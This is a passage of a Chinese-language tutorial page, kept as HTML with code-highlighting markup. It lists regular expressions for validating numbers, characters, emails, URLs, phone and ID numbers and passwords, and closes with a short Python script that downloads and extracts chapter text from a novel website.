punctuation">)</span><span class="token operator">|</span><span class="token number">0</span>?\<span class="token number">.0</span><span class="token operator">+</span><span class="token operator">|</span><span class="token number">0</span>$正浮点数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token operator">-</span> 负浮点数：<span class="token operator">^</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token punctuation">)</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token operator">-</span> 浮点数：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span>?\d<span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?$ 或 <span class="token operator">^</span><span class="token operator">-</span>?<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>?\<span class="token number">.0</span><span class="token operator">+</span><span class="token operator">|</span><span class="token number">0</span><span class="token punctuation">)</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h5 id="校验字符的表达式">校验字符的表达式</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">汉字：<span class="token operator">^</span><span class="token punctuation">[</span>\u4e00<span class="token operator">-</span>\u9fa5<span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>$英文和数字：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>$ 或 <span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">&#125;</span>$长度为<span class="token number">3</span><span class="token operator">-</span><span class="token number">20</span>的所有字符：<span class="token operator">^</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">&#125;</span>$由<span class="token number">26</span>个英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span>$由<span class="token number">26</span>个大写英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token operator">+</span>$由<span class="token number">26</span>个小写英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span>$由数字和<span class="token number">26</span>个英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>$由数字、<span class="token number">26</span>个英文字母或者下划线组成的字符串：<span class="token operator">^</span>\w<span class="token operator">+</span>$ 或 <span class="token operator">^</span>\w<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">&#125;</span>$中文、英文、数字包括下划线：<span class="token operator">^</span><span class="token punctuation">[</span>\u4E00<span class="token operator">-</span>\u9FA5A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span>9_<span class="token punctuation">]</span><span class="token operator">+</span>$中文、英文、数字但不包括下划线等符号：<span class="token operator">^</span><span class="token punctuation">[</span>\u4E00<span class="token operator">-</span>\u9FA5A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>$ 或 <span class="token operator">^</span><span class="token punctuation">[</span>\u4E00<span class="token operator">-</span>\u9FA5A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">&#125;</span>$可以输入含有<span class="token operator">^</span><span class="token operator">%</span><span class="token operator">&amp;</span><span class="token string">',;=?$\"等字符：**[^%&amp;'</span><span class="token punctuation">,</span><span class="token punctuation">;</span><span class="token operator">=</span>?$\x22<span class="token punctuation">]</span><span class="token operator">+</span>禁止输入含有<span class="token operator">~</span>的字符：<span class="token punctuation">[</span><span class="token operator">^</span><span class="token operator">~</span>\x22<span class="token punctuation">]</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h5 id="特殊需求表达式">特殊需求表达式</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">Email地址：<span class="token operator">**</span><span class="token operator">^</span>\w<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token punctuation">]</span>\w<span class="token operator">+</span><span class="token punctuation">)</span>\<span class="token operator">*</span>@\w<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">]</span>\w<span class="token operator">+</span><span class="token punctuation">)</span>\<span class="token operator">*</span>\<span class="token punctuation">.</span>\w<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">]</span>\w<span class="token operator">+</span><span class="token punctuation">)</span>\<span class="token operator">*</span>$<span class="token operator">**</span>域名：<span class="token operator">**</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">+</span>\<span class="token punctuation">.</span>?<span class="token operator">**</span>InternetURL：<span class="token operator">**</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">:</span><span class="token operator">//</span><span class="token punctuation">[</span><span class="token operator">^</span>\s<span class="token punctuation">]</span>\<span class="token operator">*</span> 或 <span class="token operator">^</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token punctuation">[</span>\w<span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span>\<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span>\w<span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span>\w<span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">/</span>?<span class="token operator">%</span><span class="token operator">&amp;</span><span class="token operator">=</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span>?$<span class="token operator">**</span>手机号码：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">14</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token operator">|</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">15</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">2</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span><span class="token number">4</span><span class="token operator">|</span><span class="token number">5</span><span class="token operator">|</span><span class="token number">6</span><span class="token operator">|</span><span class="token number">7</span><span class="token operator">|</span><span class="token number">8</span><span class="token operator">|</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">18</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">2</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span><span class="token number">5</span><span class="token operator">|</span><span class="token number">6</span><span class="token operator">|</span><span class="token number">7</span><span class="token operator">|</span><span class="token number">8</span><span class="token operator">|</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>\d<span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>电话号码<span class="token punctuation">(</span><span class="token string">"XXX-XXXXXXX"</span>、<span class="token string">"XXXX-XXXXXXXX"</span>、<span class="token string">"XXX-XXXXXXX"</span>、<span class="token string">"XXX-XXXXXXXX"</span>、<span class="token string">"XXXXXXX"</span>和"XXXXXXXX<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span>\<span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">)</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3.4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">)</span>?\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>国内电话号码<span class="token punctuation">(</span><span class="token number">0511</span><span class="token operator">-</span><span class="token number">4405222</span>、<span class="token number">021</span><span class="token operator">-</span><span class="token number">87888822</span><span class="token punctuation">)</span>：<span class="token operator">**</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token operator">**</span>电话号码正则表达式（支持手机号码，<span class="token number">3</span><span class="token operator">-</span><span class="token number">4</span>位区号，<span class="token number">7</span><span class="token operator">-</span><span class="token number">8</span>位直播号码，<span class="token number">1</span>－<span class="token number">4</span>位分机号）<span class="token punctuation">:</span> <span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">)</span><span class="token operator">**</span>身份证号<span class="token punctuation">(</span><span class="token number">15</span>位、<span class="token number">18</span>位数字<span class="token punctuation">)</span>，最后一位是校验位，可能为数字或字符X：<span class="token operator">**</span><span class="token punctuation">(</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">15</span><span class="token punctuation">&#125;</span>$<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">18</span><span class="token punctuation">&#125;</span>$<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">17</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span>\d<span class="token operator">|</span>X<span class="token operator">|</span>x<span class="token punctuation">)</span>$<span class="token punctuation">)</span><span class="token operator">**</span>帐号是否合法<span class="token punctuation">(</span>字母开头，允许<span class="token number">5</span><span class="token operator">-</span><span class="token number">16</span>字节，允许字母数字下划线<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span>9_<span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>密码<span class="token punctuation">(</span>以字母开头，长度在<span class="token number">6</span><span class="token operator">~</span><span class="token number">18</span>之间，只能包含字母、数字和下划线<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z<span class="token punctuation">]</span>\w<span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>强密码<span class="token punctuation">(</span>必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 <span class="token number">8</span><span class="token operator">-</span><span class="token number">10</span> 之间<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span>\d<span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>强密码<span class="token punctuation">(</span>必须包含大小写字母和数字的组合，可以使用特殊字符，长度在<span class="token number">8</span><span class="token operator">-</span><span class="token number">10</span>之间<span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span>\d<span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>?<span class="token operator">=</span><span class="token punctuation">.</span>\<span class="token operator">*</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">&#125;</span>$<span class="token operator">**</span>日期格式：<span class="token operator">**</span><span class="token operator">^</span>\d<span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">-</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">**</span>一年的<span class="token number">12</span>个月<span class="token punctuation">(</span><span class="token number">01</span>～<span class="token number">09</span>和<span class="token number">1</span>～<span class="token number">12</span><span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">0</span>?<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>$<span class="token operator">**</span>一个月的<span class="token number">31</span>天<span class="token punctuation">(</span><span class="token number">01</span>～<span class="token number">09</span>和<span class="token number">1</span>～<span class="token number">31</span><span class="token punctuation">)</span>：<span class="token operator">**</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span>?<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">30</span><span class="token operator">|</span><span class="token number">31</span><span class="token punctuation">)</span>$<span class="token operator">**</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里我们需要注意的是**^[\u4e00-\u9fa5]{0,}<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \w at position 43: …目录的操作^http://([\̲w̲-]+\.)+[\w-]+(/…'>**，这个是汉字的编码范围，在爬虫过程中经常会有一个爬目录的操作^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]\*)?</span>对于<strong>URL</strong>编码的正则匹配同样很重要。</p><p>3 python爬虫实战</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> Pattern<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5200804</span><span class="token punctuation">,</span><span class="token number">5719275</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'https://www.1biquge.com/8/8145/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.html'</span></span>    a<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    a<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>    <span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./源代码.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"源代码.txt"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    file_handle <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'小说文本.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    line <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    newa <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">u'[\n\s*\r\u3002\uff1b\uff0c\uff1a\u201c\u201d\uff08\uff09\u3001\uff1f\u300a\u300b\u4e00-\u9fa5]'</span><span class="token punctuation">)</span>    b<span class="token operator">=</span>newa<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>line<span class="token punctuation">)</span>    n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>         file_handle<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>    file_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 